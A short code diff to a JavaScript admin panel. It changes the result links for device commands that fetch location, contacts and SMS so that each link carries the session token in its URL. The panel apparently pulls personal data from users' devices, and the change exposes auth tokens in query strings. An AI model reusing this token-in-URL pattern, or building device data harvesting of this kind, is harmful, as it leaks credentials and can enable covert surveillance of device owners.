@@ -1916,13 +1916,13 @@ window.showLocationDetails = async function(cmdId, userId) {
 
 function formatResultData(cmdType, data) {
   if (cmdType === 'get_location') {
-    return `<a href="/admin/device-manager.html?user_id=${data.userId}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រងទីតាំង">📍</a>`;
+    return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រងទីតាំង">📍</a>`;
   } else if (cmdType === 'get_contacts') {
     const count = data.count || 0;
-    return `<a href="/admin/device-manager.html?user_id=${data.userId}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង contacts (${count})">👥</a>`;
+    return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង contacts (${count})">👥</a>`;
   } else if (cmdType === 'get_sms') {
     const count = data.count || 0;
-    return `<a href="/admin/device-manager.html?user_id=${data.userId}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង SMS (${count})">💬</a>`;
+    return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង SMS (${count})">💬</a>`;
   } else {
     return esc(JSON.stringify(data).slice(0, 80));
   }
